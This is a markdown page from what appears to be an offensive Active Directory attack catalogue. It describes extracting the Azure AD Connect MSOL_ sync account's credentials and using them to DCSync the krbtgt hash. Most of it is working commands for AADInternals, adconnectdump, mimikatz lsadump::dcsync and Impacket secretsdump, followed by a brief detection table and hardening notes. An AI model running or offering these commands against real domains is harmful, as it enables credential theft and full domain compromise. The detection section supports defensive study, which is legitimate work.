---
title: "Attack #74 — Azure AD Connect Credential Extraction"
description: "Azure AD Connect synchronizes on-premises AD with Azure AD / Entra ID. The sync service stores a privileged AD account's credentials (the MSOL_ account or…"
category: active-directory
subcategory: "Advanced & Post-Exploitation"
tags: ["active-directory", "credential-access", "privilege-escalation", "sql-injection"]
tools: ["Impacket", "Mimikatz", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Ten/🔷 Attack #74 — Azure AD Connect Credential Extraction.md"
---
# 🔷 Attack #74 — Azure AD Connect Credential Extraction

***

## 📖 How It Works

Azure AD Connect synchronizes on-premises AD with Azure AD / Entra ID. The sync service stores a **privileged AD account's credentials** (the MSOL_ account or ADSync account) in a local database (encrypted with DPAPI). This account typically has **DCSync rights by default** — extracting its credentials from the Azure AD Connect server grants immediate DCSync capability.

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Local admin on Azure AD Connect server** | To access the encrypted database |
| **Azure AD Connect installed** | With on-prem sync configured |

***

## 💻 Full Commands

```powershell
# ── AADInternals (PowerShell) ─────────────────────────────────────────────────
Install-Module AADInternals -Force
Import-Module AADInternals
Get-AADIntSyncCredentials
# Output:
# Domain: corp.local
# Username: MSOL_<hex>
# Password: <cleartext_password>

# ── adconnectdump (manual extraction) ─────────────────────────────────────────
.\adconnectdump.exe
# Extracts MSOL_ credentials from the local SQL database

# ── Now DCSync with the MSOL_ account ─────────────────────────────────────────
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
# MSOL_ account has DCSync rights by default
```

```bash
# ── From Linux (after extracting credentials) ─────────────────────────────────
secretsdump.py corp.local/MSOL_<hex>:'<password>'@DC01.corp.local -just-dc-user krbtgt
```

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4662** | Security Log (DC) | MSOL_ account performing replication |
| **4624** | Security Log | MSOL_ logon from unexpected source (not the AD Connect server) |

***

## 🔗 Attack Chain Context

```
[Azure AD Connect] ──→ Extract MSOL_ creds → DCSync → domain compromise
         │
         ├──→ 🔑 MSOL_ account has DCSync rights by DEFAULT
         ├──→ 🔗 Compromise AD Connect server → full domain compromise
         └──→ 💀 Defeated by: harden AD Connect server, use gMSA for sync, monitor MSOL_ usage
```

***

> ✅ **Attack #74 — Azure AD Connect complete.**
